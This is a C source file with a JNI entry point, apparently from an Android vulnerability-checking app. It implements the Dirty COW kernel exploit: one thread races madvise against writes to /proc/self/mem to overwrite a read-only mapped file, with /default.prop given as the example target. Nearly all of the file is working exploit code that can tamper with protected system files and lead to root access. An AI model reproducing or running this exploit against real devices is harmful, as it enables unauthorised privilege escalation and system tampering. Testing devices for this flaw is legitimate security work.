#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <jni.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define LOOP   0x75000
#define STRINGSIZE 200

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	unsigned char *offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
	int do_patch;
};

// enum defining the Error codes for JNI
typedef enum EerrorCode{
    success = 0,
    cantOpenFile,
    cantMap,
    wrongParamater
} errorCode;


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %d", addr, size);

	for(i = 0; i < LOOP; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}
	LOGV("[*] madvise = %d %d", c, i);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");
	for (i = 0; i < LOOP; i++) {
        lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
        c += write(fd, p, mem_arg->patch_size);
    }
	LOGV("[*] /proc/self/mem %d %i", c, i);
	close(fd);
	return NULL;
}

static void exploit(struct mem_arg *mem_arg, int do_patch)
{
	pthread_t pth1, pth2;

	LOGV("[*] exploit (%s)", do_patch ? "patch": "unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->do_patch = do_patch;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

errorCode callCow(int argc, const char *argv[])
{
	if (argc < 2/* && arg > 2 */) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return wrongParamater;
	}

	struct mem_arg mem_arg;
	struct stat st_oldFile;
	struct stat st_newFile;

	int oldFile=open(argv[0],O_RDONLY);
	if (oldFile == -1) {
		LOGV("could not open %s", argv[0]);
		return cantOpenFile;
	}
	if (fstat(oldFile,&st_oldFile) == -1) {
		LOGV("could not open %s", argv[0]);
		return cantOpenFile;
	}
	int newFile=open(argv[1],O_RDONLY);
	if (newFile == -1) {
		LOGV("could not open %s", argv[1]);
		return cantOpenFile;
	}
	if (fstat(newFile,&st_newFile) == -1) {
		LOGV("could not open %s", argv[1]);
		return cantOpenFile;
	}
	size_t size = st_oldFile.st_size;
	if (st_newFile.st_size != st_oldFile.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st_newFile.st_size, st_oldFile.st_size);
		if (st_newFile.st_size > size) {
			size = st_newFile.st_size;
		}
	}

	LOGV("size %d\n\n",size);

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	memset(mem_arg.patch, 0, size);

	mem_arg.unpatch = malloc(size);
	if (mem_arg.unpatch == NULL)
		LOGV("malloc");

	read(newFile, mem_arg.patch, st_newFile.st_size);
	close(newFile);
	mem_arg.patch_size = size;
	mem_arg.do_patch = 1;
    void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, oldFile, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return cantMap;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;

	exploit(&mem_arg, 1);

	close(oldFile);
	// to put back
	/*exploit(&mem_arg, 0);*/

	return success;
}

JNIEXPORT jint JNICALL
Java_fuzion24_device_vulnerability_vulnerabilities_kernel_CVE_12016_15195_runDirtyCow(JNIEnv *env, jobject obj, jobjectArray stringArray){
    int stringCount = (*env)->GetArrayLength(env, stringArray);
    char src[STRINGSIZE];
    char dest[STRINGSIZE];
	const char *argv[2];
    jstring string[2];
    argv[0] = dest;
    argv[1] = src;
    errorCode error;
    for (int i=0; i < stringCount; i++)
    {
        string[i] = (*env)->GetObjectArrayElement(env, stringArray, i);
        argv[i] = (*env)->GetStringUTFChars(env, string[i], 0);
    }
    error = callCow(stringCount, argv);
    for (int i = 0; i < stringCount; i++) {
        (*env)->ReleaseStringUTFChars(env, string[i], argv[i]);
        (*env)->DeleteLocalRef(env, string[i]);
    }
    return (jint)error;
}
